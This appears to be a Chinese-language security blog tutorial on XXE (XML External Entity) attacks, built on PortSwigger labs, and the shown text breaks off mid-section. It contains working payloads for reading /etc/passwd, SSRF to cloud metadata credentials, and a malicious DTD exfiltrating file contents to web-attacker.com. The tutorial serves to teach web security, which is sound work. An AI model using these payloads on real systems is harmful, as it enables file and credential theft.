<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="XXE - XEE - XML External EntityXML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。 XML BasicsMost of this part was taken from this amazing Portswigger page: https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;xxe&#x2F;xml-entities 什么是 XML">
<meta property="og:type" content="article">
<meta property="og:title" content="XXE漏洞知识">
<meta property="og:url" content="http://example.com/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/index.html">
<meta property="og:site_name" content="sing&#39;s Blog">
<meta property="og:description" content="XXE - XEE - XML External EntityXML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。 XML BasicsMost of this part was taken from this amazing Portswigger page: https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;xxe&#x2F;xml-entities 什么是 XML">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(220).png">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(221).png">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(222).png">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(223).png">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(224).png">
<meta property="og:image" content="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png">
<meta property="og:image" content="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png">
<meta property="og:image" content="https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(531).png">
<meta property="article:published_time" content="2022-03-29T08:10:35.000Z">
<meta property="article:modified_time" content="2022-03-29T08:17:35.330Z">
<meta property="article:author" content="sing">
<meta property="article:tag" content="xxe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/.gitbook/assets/image%20(220).png">

<link rel="canonical" href="http://example.com/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>XXE漏洞知识 | sing's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">sing's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-首页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          XXE漏洞知识
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-29 16:10:35 / Modified: 16:17:35" itemprop="dateCreated datePublished" datetime="2022-03-29T16:10:35+08:00">2022-03-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XXE/" itemprop="url" rel="index"><span itemprop="name">XXE</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="XXE-XEE-XML-External-Entity"><a href="#XXE-XEE-XML-External-Entity" class="headerlink" title="XXE - XEE - XML External Entity"></a>XXE - XEE - XML External Entity</h1><p>XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。</p>
<h2 id="XML-Basics"><a href="#XML-Basics" class="headerlink" title="XML Basics"></a>XML Basics</h2><p><strong>Most of this part was taken from this amazing Portswigger page:</strong> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/xml-entities"><strong>https://portswigger.net/web-security/xxe/xml-entities</strong></a></p>
<h3 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML? "></a>什么是 XML? <a href="#what-is-xml" id="what-is-xml"></a></h3><p>XML 代表“可扩展标记语言”。 XML 是一种设计用于存储和传输数据的语言。与 HTML 一样，XML 使用标签和数据的树状结构。与 HTML 不同，XML 不使用预定义的标签，因此可以为标签指定描述数据的名称。在 Web 历史的早期，XML 作为一种数据传输格式很流行（“AJAX”中的“X”代表“XML”）。 但它的受欢迎程度现在已经下降，后继者为JSON。.</p>
<h3 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体? "></a>什么是实体? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a></h3><p>XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。 XML 语言的规范中内置了各种实体。例如，实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code> 表示字符 <code>&lt;</code> 和 <code>&gt;</code>。这些是用于表示 XML 标记的元字符（类似编程语言中的关键字），因此当它们出现在数据中时，通常必须使用它们的实体来表示。</p>
<h4 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h4><ol>
<li>字符实体<ol>
<li>预定义字符实体</li>
<li>编号字符实体</li>
<li>命名字符实体</li>
</ol>
</li>
<li>内部实体（又称：命名实体）</li>
<li>外部实体</li>
<li>参数实体<ol>
<li>外部参数实体</li>
<li>内部参数实体</li>
</ol>
</li>
</ol>
<h4 id="理解实体"><a href="#理解实体" class="headerlink" title="理解实体"></a>理解实体</h4><ol>
<li><strong>字符实体：</strong> 字符实体，我们可以用十进制格式（&amp;#nnn;，其中 nnn 是字符的十进制值）或十六进制格式（&amp;#xhhh;，其中hhh 是字符的十六进制值）来指定任意 Unicode 字符。其中上面提及的 <em>“实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code> 表示字符 <code>&lt;</code> 和 <code>&gt;</code>”</em> 就是字符实体中预定义字符实体的一种。</li>
<li><strong>内部实体：</strong> 命名实体（在 XML 规范中也称为内部实体）就是我们在谈论 “实体” 时所指的实体。命名实体在 DTD 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。</li>
<li><strong>外部实体：</strong> 外部实体表示外部文件的内容。外部实体在有些情况下很有用，比如说，您在创建一本图书并且想将每一章存储为一个单独的文件。</li>
<li><strong>参数实体：</strong> 参数实体用 <code>% name</code> 申明，引用时用 <code>%name;</code> ，只能在DTD中申明，DTD中引用。其余实体直接用 name 申明，引用时用 <code>&amp;name;</code>，只能在 DTD 中申明，可在xml文档中引用</li>
</ol>
<h3 id="什么是-elements"><a href="#什么是-elements" class="headerlink" title="什么是 elements?"></a>什么是 elements?</h3><p>元素类型声明为 XML 文档中可能出现的元素的类型和数量、哪些元素可能出现在彼此内部以及它们必须出现的顺序设置了规则。例如：</p>
<ul>
<li><code>&lt;!ELEMENT stockCheck ANY&gt;</code> 表示父元素中可以插入任意对象 <code>&lt;stockCheck&gt;&lt;/stockCheck&gt;</code></li>
<li>&lt;!ELEMENT stockCheck EMPTY&gt; 表示应该为空 <code>&lt;stockCheck&gt;&lt;/stockCheck&gt;</code></li>
<li>&lt;!ELEMENT stockCheck (productId,storeId)&gt; 声明 <code>&lt;stockCheck&gt;</code> 应有两个子元素 <code>&lt;productId&gt;</code> 和 <code>&lt;storeId&gt;</code></li>
</ul>
<h3 id="什么是文档类型定义（DTD）"><a href="#什么是文档类型定义（DTD）" class="headerlink" title="什么是文档类型定义（DTD）? "></a>什么是文档类型定义（DTD）? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a></h3><p>XML 文档类型定义 (DTD) 包含可以定义 XML 文档的结构、它可以包含的数据值的类型以及其他项的声明。 DTD 在 XML 文档开头的可选 <code>DOCTYPE</code> 元素中声明。 DTD 可以完全独立于文档本身（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），也可以是两者的混合。</p>
<h3 id="什么是-XML-自定义实体"><a href="#什么是-XML-自定义实体" class="headerlink" title="什么是 XML 自定义实体 ? "></a>什么是 XML 自定义实体 ? <a href="#what-are-xml- custom-entities" id="what-are-xml-custom-entities"></a></h3><p>XML 允许在 DTD 中定义自定义实体。例如：</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code></p>
<p>此定义意味着在 XML 文档中对实体引用 <code>&amp;myentity;</code> 的任何使用都将替换为定义的值：“<code>my entity value</code>”。</p>
<h3 id="什么是-XML-外部实体"><a href="#什么是-XML-外部实体" class="headerlink" title="什么是 XML 外部实体? "></a>什么是 XML 外部实体? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a></h3><p>XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 之外。</p>
<p>外部实体的声明使用 <code>SYSTEM</code> 关键字，并且必须指定应从其加载实体值的 URL。例如：</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code></p>
<p>The URL can use the <code>file://</code> protocol, and so external entities can be loaded from file. For example:</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p>
<p>XML external entities provide the primary means by which <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">XML external entity attacks</a> arise.</p>
<h3 id="什么是-XML-参数实体"><a href="#什么是-XML-参数实体" class="headerlink" title="什么是 XML 参数实体?"></a>什么是 XML 参数实体?</h3><p>有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些强化，使用常规实体的 XXE 攻击会被阻止。在这种情况下，您可以改用 XML 参数实体。 XML 参数实体是一种特殊的 XML 实体，只能在 DTD 的其他地方引用。就目前而言，您只需要知道两件事。首先，XML 参数实体的声明包括实体名称前的百分号字符：</p>
<p><code>&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</code></p>
<p>其次，使用百分比字符而不是通常的 &amp; 符号来引用参数实体：<code>%myparameterentity;</code></p>
<p>这意味着您可以通过 XML 参数实体使用带外检测来测试盲 XXE，如下所示：</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;</code></p>
<p>这个 XXE 有效负载声明了一个名为“xxe”的 XML 参数实体，然后使用 DTD 中的实体。这将导致对攻击者域的 DNS 查找和 HTTP 请求，验证攻击是否成功。</p>
<h2 id="主要攻击"><a href="#主要攻击" class="headerlink" title="主要攻击"></a>主要攻击</h2><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe</a></p>
<h3 id="实体测试"><a href="#实体测试" class="headerlink" title="实体测试"></a>实体测试</h3><p>在这次攻击中，我将测试一个简单的实体声明是否有效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY toreplace &quot;3&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">    &lt;productId&gt;&amp;toreplace;&lt;/productId&gt;</span><br><span class="line">    &lt;storeId&gt;1&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(220).png"></p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>让我们尝试以不同的方式读取 <code>/etc/passwd</code>。对于 Windows，您可以尝试阅读：<code>C:\windows\system32\drivers\etc\hosts</code></p>
<p>在第一种情况下，请注意 SYSTEM “<em>**file:&#x2F;&#x2F;&#x2F;**etc&#x2F;passwd</em>“ 也可以工作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;example;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(221).png"></p>
<p>如果 Web 服务器正在使用 PHP，则第二种情况对于提取文件应该很有用（Portswiggers 实验室的情况除外）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;example;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>在这第三种情况下，我们将 <code>Element stockCheck</code> 声明为 ANY</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT stockCheck ANY&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">    &lt;productId&gt;&amp;file;&lt;/productId&gt;</span><br><span class="line">    &lt;storeId&gt;1&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck3&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(222).png"></p>
<h3 id="目录内容罗列"><a href="#目录内容罗列" class="headerlink" title="目录内容罗列"></a>目录内容罗列</h3><p>在基于 <strong>java</strong>的应用程序中，可能可以通过 XXE <strong>列出目录的内容</strong>，其有效负载如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- /etc/ --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/&quot; &gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>XXE 可用于云服务器的 SSRF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h3><p>使用<strong>上面的技术</strong>，您可以使服务器访问您控制的服务器以显示其易受攻击。但是，如果这不起作用，可能是因为 <strong>XML 实体不允许</strong>，在这种情况下，您可以尝试使用 <strong>XML 参数实体</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<h3 id="“Blind”-SSRF-带外泄露数据"><a href="#“Blind”-SSRF-带外泄露数据" class="headerlink" title="“Blind” SSRF - 带外泄露数据"></a>“Blind” SSRF - 带外泄露数据</h3><p><strong>在这种情况下，我们将让服务器加载一个带有恶意负载的新 DTD，该负载将通过 HTTP 请求发送文件的内容（对于多行文件，您可以尝试通过</strong><em><strong>ftp:&#x2F;&#x2F;</strong></em><strong>协议泄露数据)。此解释取自</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind"><strong>Portswiggers lab here</strong></a> <strong>。</strong></p>
<p>一个恶意 DTD 泄露 <code>/etc/hostname</code> 文件内容的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>

<p>This DTD carries out the following steps:</p>
<ul>
<li>定义一个名为 <code>file</code> 的 XML 参数实体，包含 <code>/etc/passwd</code> 文件的内容。</li>
<li>定义一个名为“eval”的 XML 参数实体，其中包含另一个名为“exfiltrate”的 XML 参数实体的动态声明。 <code>exfiltrate</code> 实体将通过向攻击者的 Web 服务器发出 HTTP 请求来评估，该请求包含 URL 查询字符串中的 <code>file</code> 实体的值。</li>
<li>使用 <code>eval</code> 实体，这会导致执行 <code>exfiltrate</code> 实体的动态声明。</li>
<li>使用 <code>exfiltrate</code> 实体，以便通过请求指定的 URL 来评估其值。</li>
</ul>
<p>然后，攻击者必须将恶意 DTD 托管在他们控制的系统上，通常是将其加载到他们自己的网络服务器上。例如，攻击者可能会在以下 URL 提供恶意 DTD：<br><code>http://web-attacker.com/malicious.dtd</code></p>
<p>最后，攻击者必须向易受攻击的应用程序提交以下 XXE 有效负载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XXE 有效负载声明了一个名为“xxe”的 XML 参数实体，然后使用 DTD 中的实体。这将导致 XML 解析器从攻击者的服务器获取外部 DTD 并内联解释它。然后执行恶意 DTD 中定义的步骤，并将 <code>/etc/passwd</code> 文件传输到攻击者的服务器。</p>
<h3 id="基于错误-XXE-攻击-外部-DTD"><a href="#基于错误-XXE-攻击-外部-DTD" class="headerlink" title="基于错误 XXE 攻击(外部 DTD)"></a>基于错误 XXE 攻击(外部 DTD)</h3><p><strong>在这种情况下，我们将让服务器加载一个恶意 DTD，该 DTD 将在错误消息中显示文件的内容（这仅在您可以看到错误消息时才有效）。</strong> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind"><strong>Example from here.</strong></a></p>
<p>您可以使用恶意外部 DTD 触发包含 <code>/etc/passwd</code> 文件内容的 XML 解析错误消息，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>

<p>此 DTD 执行以下步骤：</p>
<ul>
<li>定义一个名为 <code>file</code> 的 XML 参数实体，包含 <code>/etc/passwd</code> 文件的内容。</li>
<li>定义一个名为 <code>eval</code> 的 XML 参数实体，其中包含另一个名为 <code>error</code> 的 XML 参数实体的动态声明。 <code>error</code> 实体将加载一个不存在的文件，该文件的名称包含 <code>file</code> 实体的值。</li>
<li>使用 <code>eval</code> 实体，这会导致执行 <code>error</code> 实体的动态声明。</li>
<li>使用 <code>error</code> 实体，尝试加载不存在的文件，从而导致错误消息包含不存在文件的名称，即 <code>/etc/passwd</code> 文件的内容。</li>
</ul>
<p>调用外部 DTD 错误：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>您应该会在 Web 服务器响应的错误消息中看到文件的内容。<br><img src="/../.gitbook/assets/image%20(223).png"></p>
<p><em><strong>上述技术适用于外部 DTD，但通常不适用于在DOCTYPE元素中完全指定的内部 DTD。这是因为该技术涉及<code>在一个参数实体的定义中使用 XML 参数实体</code>。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中是不允许的。（一些解析器可能会兼容这种错误，但许多解析器不会。）</strong></em></p>
<h3 id="基于错误的-XXE-攻击-系统内置-DTD"><a href="#基于错误的-XXE-攻击-系统内置-DTD" class="headerlink" title="基于错误的 XXE 攻击 (系统内置 DTD)"></a><strong>基于错误的 XXE 攻击 (系统内置 DTD)</strong></h3><p>当 <strong>out-of-band interactions are blocked</strong>（即无法外联的情况），但 blind XXE 存在的情况应该如何处置？ <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind">相关资料</a>。</p>
<p>在这种情况下，由于 XML 语言规范中的漏洞，仍然可能<strong>触发包含敏感数据的错误消息</strong>。如果文档的<strong>DTD 混合使用内部和外部DTD</strong>声明，则<strong>内部DTD 可以重新定义在外部DTD</strong>中声明的实体。发生这种情况时，对<code>在一个参数实体的定义中使用 XML 参数实体</code>的限制就会放宽。</p>
<p>这意味着攻击者可以在内部 DTD 中使用<strong>基于错误的 XXE 技术</strong>，前提是他们使用的 XML 参数实体是<strong>重新定义在外部 DTD 中声明的实体</strong>。当然，如果带外连接被阻止，则无法从远程位置加载外部 DTD。相反，它需要是一个<strong>应用程序服务器本地的外部 DTD 文件</strong>。 <em>从本质上讲，攻击涉及调用恰好存在于本地文件系统上的 DTD 文件，并重新利用它来重新定义现有实体，从而触发包含敏感数据的解析错误。</em></p>
<p>例如，假设在服务器文件系统的“&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd”位置有一个 DTD 文件，该 DTD 文件定义了一个名为“custom_entity”的实体。攻击者可以通过提交如下所示的混合 DTD 来触发包含 <code>/etc/passwd</code> 文件内容的 XML 解析错误消息：</p>
